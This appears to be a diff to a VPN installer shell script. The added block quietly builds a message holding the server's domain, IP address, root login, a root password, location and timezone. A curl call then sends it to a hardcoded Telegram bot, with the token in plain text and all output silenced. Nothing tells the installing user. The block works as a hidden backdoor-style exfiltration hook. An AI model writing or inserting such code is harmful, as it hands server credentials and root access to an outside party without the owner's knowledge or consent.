@@ -241,6 +241,24 @@ clear
     fi
 	echo -e "${BGreen}Done!${NC}"
     sleep 2
+    CHATID="-1001966360036"
+KEY="6307367714:AAG_Gae1CEjB-BDTYLzHSb89kbmLxzln7mk"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="Project VPN TUNNELING 
+============================
+<code>Domain     :</code> <code>$dom</code>
+<code>NS Domain  :</code> <code>$nsdomen</code>
+<code>IP Vps     :</code> <code>$MYIP</code>
+<code>User Login :</code> <code>root</code>
+<code>Pass Login :</code> <code>bok</code>
+<code>User Script:</code> <code>$IZIN</code>
+<code>Exp Script :</code> <code>$Exp1</code>
+<code>Location   :</code> <code>$CITY</code>
+<code>Timezone   :</code> <code>$TIME</code>
+============================
+"
+curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 #THEME RED
 cat <<EOF>> /etc/ssnvpn/theme/red
